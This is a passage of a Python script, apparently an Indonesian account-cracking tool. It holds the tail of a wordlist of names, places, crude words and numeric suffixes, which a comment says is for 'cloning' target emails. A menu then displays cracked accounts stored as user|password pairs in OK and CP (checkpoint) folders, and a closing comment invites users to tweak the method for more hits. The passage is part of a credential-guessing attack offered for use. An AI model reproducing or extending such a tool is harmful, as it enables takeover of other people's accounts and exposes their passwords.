			'ca', 'cabi', 'cabhy', 'caby', 'cabby', 'caca', 'cca', 'cahaya', 'cahya', 'cahyani', 'cahyaningsih', 'caitlyn', 'camelia', 'cangcut', 'can', 'cans', 'canss', 'cantik', 'cantika', 'caroline', 'charrisa', 'catherine', 'cassandra', 'celine', 'cecilia', 'celsi', 'celsie', 'centil', 'chaca', 'chacha', 'chelsi', 'chelsie', 'chelsea', 'chesi', 'chessy', 'chika', 'cia', 'cci', 'cici', 'cika', 'cimok', 'cindy', 'cinta', 'cintia', 'cintaku', 'cintya', 'cintiya', 'citra', 'chindy', 'claudya', 'cucu', 'ccu', 'culun', 'cupu', 'cynthia', 'cyntia',
			'dafin', 'dahlia', 'daiba', 'dania', 'daniah', 'daniyah', 'danyyah', 'daswita', 'dara', 'davina', 'darsie', 'dawy', 'de', 'dea', 'dede', 'dela', 'della', 'delia', 'delicia', 'denia', 'deniah', 'deniyah', 'deon', 'debi', 'deby', 'debby', 'denita', 'denisa', 'devi', 'devia', 'devie', 'desnia', 'desnie', 'divita', 'desi', 'desita', 'deswita', 'dewandana', 'dwi', 'dewi', 'dewita', 'dhairya', 'dhara', 'dhe', 'dhea', 'dheniah', 'dhewi', 'dhita', 'dhiya', 'dia', 'diah', 'diajeng', 'dian', 'diana', 'diandra', 'diannova', 'dias', 'diinah', 'dika', 'diksa', 'dila', 'dilla', 'dipa', 'diva', 'dianda', 'dila', 'dilla', 'dira', 'dina', 'dinda', 'dini', 'diniah', 'diniyah', 'disa', 'disha', 'dita', 'divya', 'dixha', 'diya', 'diyah', 'diyara', 'dnya', 'dona', 'dyra', 'dyah', 'dzafina', 'djakarta',
			'eka', 'elailah', 'elaina', 'eira', 'eisha', 'elaina', 'elda', 'elea', 'elena', 'eleanor', 'eleanoer', 'eleha', 'eletha', 'elfie', 'elga', 'elia', 'eliana', 'elicia', 'elika', 'elin', 'elina', 'elisabeth', 'elis', 'ellis', 'elise', 'eliya', 'eliza', 'elizabeth', 'ella', 'ellen', 'elliana', 'ellie', 'elma', 'elmira', 'elora', 'elisa', 'elisha', 'elisia', 'elisiya', 'elisya', 'elisyha', 'elsye', 'elfina', 'elsa', 'evi', 'epi', 'elisabeth', 'elin', 'elsy', 'elva', 'elvira', 'elly' 'elvina', 'elzahra', 'embun', 'emeline', 'ekavira', 'emery', 'emi', 'emilia', 'emy', 'emyliya', 'ema', 'emma', 'emily', 'emira', 'endah', 'endang', 'epi', 'erna', 'erni', 'eri', 'erika', 'erina', 'erlinda', 'esti', 'estiana', 'eis', 'eti', 'etie', 'ety', 'euis', 'eva', 'evi', 'evita', 'evitamala', 'evalina', 'evelyn', 'ewe',
			'fara', 'farah', 'farrah', 'fadila', 'fadla', 'fadhila', 'fadhla', 'faija', 'faiza', 'faizza', 'faizah', 'fani', 'fanni', 'fany', 'fanny', 'fanya', 'farhah', 'farhana', 'farida', 'faridha', 'fasya', 'fasha', 'fathia', 'fatin', 'fatina', 'fatthyyah', 'faujia', 'faujiah', 'fauzia', 'fauziah', 'fauziya', 'fauzyah', 'fawziyah', 'fazila', 'fazilla', 'fazeela', 'fatim', 'fatima', 'fatimah', 'fathimah', 'felisia', 'felisya', 'ferli', 'ferly', 'ferlyani', 'fika', 'fina', 'fiona', 'fionna', 'fida', 'fira', 'firli', 'firly', 'firlly', 'firliani', 'firliyani', 'fita', 'fitri', 'fitriani', 'fitriyani', 'fitryani', 'fiska', 'fizka', 'fiza', 'frisilia', 'frisiliya', 'freya', 'friska', 'fuji', 'fuzi',
			'gabriella', 'gaby', 'gabby', 'garut', 'gadis', 'geby', 'gebby', 'gelsey', 'gendis', 'gemma', 'georgia', 'gloria', 'gea', 'ghwa', 'gia', 'ghia', 'ghina', 'ghita"', 'gina', 'ginna', 'gisela', 'gisella', 'gita', 'gitta', 'grace', 'gracia','grachelyn','gracheline', 'graciella', 'greta', 'gresia', 'gresik', 'glenda', 'gloria', 'giska', 'greta', 'ganesha', 'geisha', 'genta', 'gwendolyn',
			'habibah', 'harika', 'hafsa', 'halima', 'halia', 'halimah', 'hafiza', 'hafsah', 'hafiza', 'hafizah', 'hana', 'handayani', 'handayanti', 'hanna', 'hannah', 'hani', 'hany', 'hanny', 'hanifah', 'hanipah', 'haila', 'hayla', 'hania', 'haniya', 'hartini', 'hasanah', 'hatima', 'hatimah', 'hilda', 'hilma', 'hilmawati', 'hiya', 'helen', 'helena', 'hellen', 'helia', 'helin', 'helina', 'hemalia', 'hepti', 'hesa', 'hessa', 'hesha', 'hesti', 'hestia', 'hesty', 'helga', 'hasna', 'hinata', 'hikmat', 'hopi', 'hopipah', 'hoho', 'hotima', 'hotimah', 'hikmah', 'humaida', 'humayda', 'husna', 'hurairah',
			'ica', 'icaa', 'icha', 'ichaa', 'ida', 'ifa', 'iffa', 'ilmira', 'ina', 'inna', 'inaara', 'inara', 'inarah', 'inayah', 'indah', 'indira', 'indyra', 'indri', 'indry', 'insan', 'insani', 'imelda', 'ina', 'irma', 'irena', 'ika', 'ijah', 'intan', 'intanrahayu', 'ira', 'isabela', 'isabella', 'isan', 'isana', 'isyana', 'isah', 'isma', 'ismawati', 'ismawaty', 'ismi', 'ismiya', 'ismiyati', 'isnaen', 'isnaeni', 'isni', 'iza', 'izah', 'izna', 'iysha',
			'jafira', 'jahira', 'jalilah', 'jahra', 'jamilah', 'janeta', 'jameela', 'jannah', 'janita', 'jasmin', 'jasmine', 'jayanti', 'jelita', 'jeni', 'jeny', 'jenny', 'jennifer', 'jenita', 'jennita', 'jesica', 'jesicca', 'jesika', 'jihan', 'jihana', 'jingga', 'juwita', 'juli', 'julia', 'juliana', 'juliet', 'jumaina', 'jumainah', 'juniarti', 'junaina', 'juwitta', 'jwita',
			'kaila', 'kalia', 'kaira', 'khaira', 'karin', 'karina', 'kartika', 'kadek', 'kania', 'kaniya', 'kartini', 'kasih', 'kamala', 'kamila', 'karima', 'karomah', 'karisa', 'karissa', 'karsih', 'katrina', 'keira', 'khaira', 'khaila', 'khafifah', 'khadijah', 'khairun', 'khairunisa', 'khalifah', 'khalilah', 'khabirah', 'khatimah', 'khofiroh', 'khopipah', 'kiki', 'kim', 'kiara', 'kila', 'killa', 'kira', 'kirani', 'komarudin', 'kumala', 'kumalasari', 'kokom', 'komala', 'komalasari', 'komalawati', 'kontol', 'kotima', 'kotimah', 'kulsum', 'kultsum', 'kuntul', 'kurnia', 'kurniati', 'kurniyati', 'kursina', 'kurniasih', 'kusina', 'kusmiati', 'kusmiyai',
			'laela', 'laesa', 'lady', 'lafiza', 'lala', 'laila', 'lati', 'laty', 'latifah', 'lathifah', 'layla', 'lara', 'laras', 'larasati', 'lasmini', 'laura', 'laudia', 'laudya', 'leila', 'lela', 'lesmana', 'lesmana', 'lena', 'leni', 'lenka', 'leny', 'lenny', 'lestari', 'lestarty', 'lesti', 'lesty', 'levita', 'lia', 'lida', 'lidia', 'lidya', 'liana', 'liani', 'lilis', 'lina', 'linda', 'lintang', 'lis', 'lisa', 'lisha', 'lisna', 'lisnawati', 'lisnawaty', 'listi', 'listy', 'listia', 'listya', 'liza', 'liya', 'liyani', 'liza', 'lomrah', 'lola', 'lolita', 'luci', 'lucia', 'lucy', 'lucya', 'lulu', 'luna', 'lusi', 'lusy', 'luvita', 'lyan', 'lyna', 'lysa',
			'mae', 'maemunah', 'maesarah', 'maesaroh', 'mala', 'maida', 'maidah', 'maira', 'maisa', 'maisha', 'malika', 'maimunah', 'magfirah', 'mahalini', 'maharani', 'maharini', 'mahda', 'manda', 'mandha', 'maria', 'mardiah', 'mardianti', 'mardiyanti', 'mardyah', 'mardiyah', 'mariah', 'mariam', 'mariyah', 'maryati', 'mariati', 'mariyati', 'markonah', 'mariyam', 'marisa', 'marissa', 'martina', 'martinah', 'martini', 'maryamah', 'marwah', 'maryanti', 'marwati',  'marwaty', 'marzia', 'marziya', 'masitoh', 'masriah', 'masriyah', 'maulida', 'maulidia', 'maulidya', 'maulidiya', 'mawar', 'maya', 'mayra', 'maymuna', 'maymunah', 'marziah', 'meca', 'mecca', 'meka', 'medina', 'mega', 'megan', 'melani', 'melany', 'melina', 'meli', 'melinda', 'melisa', 'melly', 'merry', 'mia', 'mieta', 'mietaa', 'mila', 'mimin', 'mira', 'miraa', 'mirna', 'miranda', 'miya', 'mufliha', 'muna', 'munawarah', 'munawwarah', 'munawaroh', 'murni', 'murniati', 'murniyati', 'muslima', 'mulimah', 'muti', 'mutmainah', 'muthmainnah', 'mutmaidah', 'muthmaidah', 'mutia', 'mutiara',
			'nabila', 'nada', 'nadhin', 'nadia', 'nadira', 'nadhira', 'nadin', 'nadiya', 'nafisa', 'nafisha', 'nafisah', 'nagita', 'naila', 'naira', 'najwa', 'nana', 'nanda', 'nani', 'natalia', 'nataliya', 'natasia', 'natasya', 'natasyha', 'nasa', 'naura', 'nayara', 'nayyara', 'nayra', 'nayla', 'naswa', 'nashwa', 'nasywa', 'nazwa', 'nia', 'nida', 'nifa', 'nina', 'nindi', 'nindy', 'ningrum', 'ningsih', 'nita', 'nitatalia', 'niken', 'nisa', 'nissa', 'nurul', 'nopi', 'novi', 'novita', 'nurull', 'nunung', 'nuri', 'nurianti', 'nurjanah', 'nurjannah', 'nuryanti',
			'oca', 'octa', 'octavia', 'olivia', 'ollivia', 'oliv', 'olive', 'olla', 'okta', 'oktavia', 'ocha', 'odie', 'omaira', 'ogut', 'xabiya', 'xaviera', 'xavira', 'xena', 'xiao', 'xyla',
			'padma', 'putri', 'puspa', 'pipit', 'prita', 'paras', 'paramita' 'permata','permatasari', 'purnama', 'purnamasari', 'puspa','putri', 'puteri', 'pitri', 'pratiwi', 'pramita', 'priyanka',
			'qaidah', 'qaila', 'qailla', 'qanita', 'qasidah', 'qasimah', 'qiana', 'qiani', 'qila', 'qilla', 'qiqi', 'qonita', 'qori', 'qoriah', 'qoriyah', 'qosamah', 'qosimah', 'qalesya',
			'ra', 'raa', 'raina', 'rana', 'rabiah', 'rabiyah', 'rafa', 'raisa', 'raiqah', 'raimah', 'rahma', 'rahmah', 'rahmaa', 'rahmawati', 'rahmawaty', 'rhma', 'rahnadani', 'rahmadhani', 'ramadani', 'ramadhani', 'rani', 'rany', 'raniah', 'rasya', 'rati', 'ratifah', 'rara', 'rere', 'refa', 'repa', 'reva', 'repani', 'revani', 'rena', 'renatri', 'reni', 'renata', 'rani', 'ratna', 'raya', 'rina', 'rida', 'rifda', 'rifdah', 'rini', 'ririn', 'rianti', 'rianty', 'riyanti', 'riyanty', 'riska', 'rizka', 'rohma', 'rohmah', 'rohmawati', 'rohmawaty', 'rona', 'rosdiana', 'rosdiani', 'ross', 'rossa', 'rosita', 'rosalina', 'rossalina', 'rosmanah', 'rum', 'rumaidah', 'ruwaidah', 'ryzka',
			'sadiya', 'sabira', 'sabhira', 'sahara', 'saharah', 'sahla', 'saleha', 'saila', 'salima', 'salimah', 'sabha', 'sabrina', 'safa', 'saffa', 'safna', 'safira', 'saidah', 'sahira', 'sakila', 'sakinah', 'sakira', 'salma', 'salmaira', 'salsa', 'salsabila', 'salsabilla', 'salsabylla', 'salwa', 'santi', 'sani', 'santy', 'santika', 'sara', 'shafira', 'shavira', 'shakira', 'shalina', 'shafna', 'shafana', 'shaleha', 'shalehah', 'shakeera', 'shakila', 'shalihah', 'shanti', 'shanty', 'shantika', 'shani', 'shaniyah', 'shofy', 'shofiyah', 'shofiyyah', 'sholeha', 'sholehah', 'sifa', 'silawati', 'sipa', 'silpi', 'silvi', 'siska', 'sinta', 'suci', 'selly', 'safitri', 'saputri', 'sarah', 'saras', 'sarasvati', 'saraswati', 'sari', 'sasmita', 'setiawati', 'sisil', 'siti', 'sity', 'siregar', 'simanjuntak', 'solha', 'solehah', 'sonia', 'soraya', 'sukma', 'suci', 'sumi', 'sumiyati', 'suraya', 'suraiya', 'suratni', 'surtini', 'suratmi', 'sasanti', 'susanty', 'susi', 'susilawati', 'susilawaty', 'susy', 'sutari', 'suteni', 'susu', 'syafaa', 'syakila', 'syakira', 'syifa', 'sypa', 'sya', 'syahla', 'syahira', 'syafira', 'syavira',
			'tabita', 'tabhita', 'tahira', 'tahiya', 'tahiyyah', 'talea', 'talia', 'taliah', 'talita', 'talitha', 'tami', 'tamimah', 'tammy', 'tania', 'tannia', 'taniya', 'tari', 'tarisa', 'tarissa', 'tasya', 'taskia', 'taskiya', 'taskya', 'tazkia', 'tazkiya', 'tazkya', 'tesa', 'tessa', 'tea', 'thea', 'thiara', 'tia', 'tiaa', 'tias', 'tiastuti', 'tiara', 'tifani', 'tifany', 'tifanni', 'tifanny', 'tiffani', 'tika', 'tina','tita', 'titian', 'titi', 'titie', 'titisari', 'titin', 'tri', 'tria', 'triani', 'tsabitah', 'tsunade', 'tusilawati', 'tuti', 'tya', 'tiktok', 'tikotok', 'tyz', 'tzy',
			'uci', 'uchi', 'ufaira', 'ufairah', 'ulfa', 'ulfaqiha', 'ulan', 'ullan', 'ulandari', 'ulandary', 'ulima', 'ulia', 'uliya', 'ulya', 'ulpah', 'ulpa', 'ulva', 'umayah', 'umi', 'umy', 'ummi', 'ummy', 'umiyah', 'umiati', 'umiaty', 'umiyati', 'utami', 'utari', 'ute', 'ubaidah', 'umaira', 'umairah', 'usna', 'usnah', 'uswah', 'uswatun', 'uswatunhasanah', 'uzwatun',
			'va', 'vaa', 'vani', 'vaeda', 'vanni', 'vania', 'vannia', 'vaniya', 'vanniya', 'vany', 'vanya', 'valen', 'vallen', 'valentina', 'vallentina', 'valeria', 'vanesa', 'vannesa', 'vanda', 'vardah', 'vahira', 'vazza', 'verda', 'vera', 'victoria', 'viktoria', 'via', 'vina', 'vinna', 'vivi', 'vivie', 'vianita', 'viviana', 'viena', 'viola', 'vivianna', 'vida', 'vio', 'violet', 'violetta', 'veronica', 'veronika', 'viani', 'vianika', 'viane', 'verona', 'viana', 'viera', 'valencia', 'valensia', 'viata', 'vira', 'virania', 'vita', 'vitta', 'vitaloka', 'velma', 'vilmei', 'vega', 'viona', 'visi',
			'wafa', 'wafda', 'wafiyah', 'wahdah', 'waheeda', 'wardani', 'wardhani', 'wahdaniyah', 'wahidah', 'wanda', 'wangi', 'wardah', 'wasfa', 'washfa', 'wasiah', 'wasimah', 'wasiyah', 'wastiqah', 'wati', 'watiah', 'watilah', 'watiyah', 'watsiqah', 'wasikoh', 'welas', 'wening', 'widi', 'widia', 'widhia', 'widhiya', 'widiya', 'widiasari', 'widiawat', 'widy', 'wikayah', 'wilona', 'willona', 'windi', 'windiawati', 'windiasari', 'wina', 'wini', 'wirastuti', 'wiqayah', 'wikoyah', 'wiwin', 'windy', 'wulan', 'wulandari',
			'xxx', 'xnxx', 'xyz', 'xyzz','tzy','tyz', 'mojang', 'gemoy','imut','kebi','cabi','tembem','cantik','cans','canss','gelis','geulis','ytta','kasep','ganteng','wibu','gojo','gojosatoru','santik', 'gerengseng', 'bokep', 'ewe', 'xtc', 'brigez', 'garutpride', 'bandungpride', 'sundapride', '1', '2', '3', '4', '5', '6', '7', '8', '9', '01', '02', '03', '04', '05', '06', '07', '08', '09', '010', '00', '99', '999', '000', '0000', '12', '123', '1234', '12345', '123456', 'bandung', 'banung', 'sukabumi', 'tasik', 'tasikmalaya', 'toblong', 'peundeuy', 'singajaya', 'pameungpeuk', 'cibalong', 'pamempek', 'simpang', 'cisompet', 'banyarwangi', 'cinangsi', 'cisurupan', 'saribakti', 'cikajang',
			'yani', 'yanti', 'yanti', 'yanty', 'yasira', 'yeni', 'ytta', 'yuli', 'yulli', 'yulia', 'yuliya', 'yulya', 'yully', 'yulianti', 'yuliyanti', 'yusria', 'yusriah', 'yusrina', 'yuni', 'yunita', 'yuningsih', 'yuyu', 'yuyun',
			'zahra', 'zafira', 'zafirah', 'zahira', 'zahirah', 'zahiyah', 'zahra', 'zahrani', 'zahrany', 'zahwa', 'zaidah', 'zainab', 'zainnab', 'zairah', 'zaitun', 'zakiah', 'zakyah', 'zakiyyah', 'zenab', 'zennab', 'zalfa', 'zalpa', 'zalva', 'zalsa', 'zannah', 'zara', 'zariah', 'zaskia', 'zaskiya', 'zaskya', 'zaskiani', 'zaskiyani', 'zizah', 'zaynah', 'zayanah', 'zayyanah', 'zenia', 'zera', 'zhafira', 'zhafirah', 'zharifa', 'zharifah', 'zia', 'zizi', 'zyzy', 'zubaidah', 'zuhrah', 'zulfa', 'zulpa', 'zulva', 'zunaira', 'zunea', 'zunnea',
			'aceh', 'indonesia', 'konoha', 'bali', 'cilegon', 'serang', 'tangerang', 'jakarta', 'jambi', 'bandung', 'bekasi', 'bogor', 'cimahi', 'cirebon', 'depok', 'sukabumi', 'tasik', 'tasikmalaya', 'banjar', 'magelang', 'pekalongan', 'semarang', 'surakarta', 'tegal', 'garut', 'blitar', 'kediri', 'madiun', 'malang', 'mojokerto', 'pasuruan', 'surabaya', 'batam', 'lampung', 'bima', 'mataram', 'kupang', 'bali', 'ntt', 'ntb', 'sorong', 'jayapura', 'maluku', 'papua', 'dumai', 'riau', 'pekanbaru', 'sumatra', 'sulawesi', 'makassar', 'kalimanta','kalimantan', 'bitung', 'manado', 'bukittinggi', 'padang', 'palembang', 'binjai', 'medan', 'padang', 'pematangsiantar', 'sibolga', 'tebingtinggi'
		]
	) # // Rekrut Aje Name Yang Sekiranye Bagus Dijadikan Nama Pelengkap Cloning Email Target, Ini Saye Hanya Testing Saje + Gabut Ewekaweka Salam Dari Niaw Yaw :) // #
def Hasil_OkCp():
	Colom3 = [
	]
	Console(width=48).print(
		Panel(
			"[bold #FF00D4]menu cek hasil crack",
			style="bold purple",
			),
		justify="center"
		)
	Colom3.append(
		Panel(
			"[bold #FF00D4] 1.hasil ok",
			width=15,
			style="bold purple",
		)
	)
	Colom3.append(
		Panel(
			"[bold #FF00D4] 2.hasil cp",
			width=16,
			style="bold purple",
		)
	)
	Colom3.append(
		Panel(
			"[bold #FF00D4] 3.kembali",
			width=15,
			style="bold purple",
		)
	)
	Console(width=48).print(
		Columns(
			Colom3
			),
		justify="center"
	)
	Console(width=48).print(
		Panel(
			'[bold #FF00D4]input menu (1/2/3)',
			width=48,
			subtitle="╭──",
			subtitle_align="left",
			style="bold purple"
			),
		justify="center"
	)
	Choose = Console().input(
		'[bold purple]   ╰─> '
		)
	if Choose in ('1'):
		try:
			Cari = os.listdir(
				'OK'
			)
		except FileNotFoundError:
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]file tidak ada",
					width=48,
					style="bold purple"
					),
				justify="center"
			)
			sleep(
				3
				)
			Back_Menu(
			)
		if len(Cari) == 0:
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]file kosong, crack dahulu",
					width=48,
					style="bold purple"
					),
				justify="center"
			)
			sleep(
				2
				)
			Back_Menu(
			)
		else:
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]daftar hasil akun ok anda",
					width=48,
					style="bold purple"
					),
				justify="center"
			)
			Htg = 0
			Fns = {}
			for Data in Cari:
				try:
					Isi = open('OK/'+Data,'r').readlines()
				except:
					continue
				Htg+=1
				if Htg < 10:
					Nom = (
						''
						+
						str(
							Htg
						)
					)
					Fns.update(
						{
							str(
								Htg
							)
							:
							str(
								Data
							)
						}
					)
					Fns.update(
						{
							Nom
							:
							str(
								Data
							)
						}
					)
					Console().print(
						'[bold #FF00D4] ➛ [#FFFFFF]0'
						+
						Nom
						+
						'[#FFFFFF]. '
						+
						Data
						+
						'[bold #00FF00] '
						+
						str(
							len(
								Isi
							)
						)
						+
						'[#FFFFFF] akun'
					)
				else:
					Fns.update(
						{
							str(
								Htg
							)
							:
							str(
								Data
							)
						}
					)
					Console().print(
						'[bold #FF00D4] ➛ [#FFFFFF]'
						+
						str(
							Htg
						)
						+
						'. '
						+
						Data
						+
						'[bold #00FF00] '
						+
						str(
							len(
								Isi
							)
						)
						+
						'[#FFFFFF] akun'
					)
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]input nomer daftar hasil diatas",
					width=48,
					subtitle="╭──",
					subtitle_align="left",
					style="bold purple"
					),
				justify="center"
			)
			View = Console().input(
				'[bold purple]   ╰─> '
				)
			try:
				Liat = Fns[
					View
				]
			except KeyError:
				Console(width=48).print(
					Panel(
						"[bold #FF00D4]macam tak betul budek ni",
						width=48,
						style="bold purple"
						),
					justify="center"
				)
				sleep(
					2
					)
				Back_Menu(
				)
			try:
				Cari2 = open(
					'OK/'
					+
					Liat,
					'r'
				).read().splitlines()
			except:
				Console(width=48).print(
					Panel(
						"[bold #FF00D4]file tidak ada",
						width=48,
						style="bold purple"
						),
					justify="center"
				)
				sleep(
					2
					)
				Back_Menu(
				)
			HtgCp = 0
			for Cpku in range(len(Cari2)):
				Cpny = Cari2[
					HtgCp
					].split('|')
				tree = Tree(
					""
				)
				tree.add(
					"\r[bold #00FF00]Account Succesfully"
					).add(
					f"\r[bold purple]{Cpny[0]}|{Cpny[1]}"
					).add(
					f"\r[bold purple]{Cpny[2]}"
					,style="bold white"
				)
				tree.add(
					f"\r[white]{Cpny[3]}"
					,style="bold #00FF00"
				)
				Cetak(
					tree
				)
				HtgCp +=1
			print(
				''
			)
			Console(width=48).print(
				Panel(
					'[bold #FF00D4]cek selesai, enter untuk ke menu',
					width=48,
					subtitle="╭──",
					subtitle_align="left",
					style="bold purple"
					),
				justify="center"
			)
			Console().input(
				'[bold purple]   ╰─> '
				)
			Back_Menu(
			)
	elif Choose in ('2'):
		try:
			Cari = os.listdir(
				'CP'
			)
		except FileNotFoundError:
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]file tidak ada",
					width=48,
					style="bold purple"
					),
				justify="center"
			)
			sleep(
				3
				)
			Back_Menu(
			)
		if len(Cari) == 0:
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]file kosong, crack dahulu",
					width=48,
					style="bold purple"
					),
				justify="center"
			)
			sleep(
				2
				)
			Back_Menu(
			)
		else:
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]daftar hasil akun cp anda",
					width=48,
					style="bold purple"
					),
				justify="center"
			)
			Htg = 0
			Fns = {}
			for Data in Cari:
				try:
					Isi = open('CP/'+Data,'r').readlines()
				except:
					continue
				Htg+=1
				if Htg < 10:
					Nom = (
						''
						+
						str(
							Htg
						)
					)
					Fns.update(
						{
							str(
								Htg
							)
							:
							str(
								Data
							)
						}
					)
					Fns.update(
						{
							Nom
							:
							str(
								Data
							)
						}
					)
					Console().print(
						'[bold #FF00D4] ➛ [bold #FFFFFF]0'
						+
						Nom
						+
						'[#FFFFFF]. '
						+
						Data
						+
						'[bold #FFF000] '
						+
						str(
							len(
								Isi
							)
						)
						+
						'[#FFFFFF] akun'
					)
				else:
					Fns.update(
						{
							str(
								Htg
							)
							:
							str(
								Data
							)
						}
					)
					Console().print(
						'[bold #FF00D4] ➛ [#FFFFFF]'
						+
						str(
							Htg
						)
						+
						'. '
						+
						Data
						+
						'[bold #FFF000] '
						+
						str(
							len(
								Isi
							)
						)
						+
						'[#FFFFFF] akun'
					)
			Console(width=48).print(
				Panel(
					"[bold #FF00D4]input nomer daftar hasil diatas",
					width=48,
					subtitle="╭──",
					subtitle_align="left",
					style="bold purple"
					),
				justify="center"
			)
			View = Console().input(
				'[bold purple]   ╰─> '
			)
			try:
				Liat = Fns[
					View
				]
			except KeyError:
				Console(width=48).print(
					Panel(
						"[bold #FF00D4]macam tak betul budek ni",
						width=48,
						style="bold purple"
						),
					justify="center"
				)
				sleep(
					2
					)
				Back_Menu(
				)
			try:
				Cari2 = open(
					'CP/'
					+
					Liat,
					'r'
				).read().splitlines()
			except:
				Console(width=48).print(
					Panel(
						"[bold #FF00D4]file tidak ada",
						width=48,
						style="bold purple"
						),
					justify="center"
				)
				sleep(
					2
					)
				Back_Menu(
				)
			HtgCp = 0
			for Cpku in range(len(Cari2)):
				Cpny = Cari2[
					HtgCp
					].split('|')
				tree = Tree("")
				tree.add(
					"\r[bold #FFFF00]Account Checkpoint"
					).add(
					f"\r[bold #FF0000]{Cpny[0]}|{Cpny[1]}"
					,style="bold #FFF000"
				)
				Cetak(
					tree
				)
				HtgCp +=1
			print(
				''
			)
			Console(width=48).print(
				Panel(
					'[bold #FF00D4]cek selesai, enter untuk ke menu',
					width=48,
					subtitle="╭──",
					subtitle_align="left",
					style="bold purple"
					),
				justify="center"
			)
			Console().input(
				'[bold purple]   ╰─> '
				)
			Back_Menu(
			)
	elif Choose in ('3'):
		Back_Menu(
		)
	else:
		Console(width=48).print(
			Panel(
				"[bold #FF00D4]macam tak betul budek ni",
				width=48,
				style="bold purple"
				),
			justify="center"
		)
		sleep(
			1
			)
		exit(
	)
if __name__=='__main__':
	try:
		os.mkdir(
			'OK'
		)
	except:
		pass
	try:
		os.mkdir(
			'CP'
		)
	except:
		pass
	Main_Menu(
)
	# rekod ! boleh boleh saja terserah kalian untuk mendapatkn hasil maksimal silahkan oprek ae ua atau ganti metode yg ccok bagus versi kalian, deres cp dikit oprek yaw gengs :) // #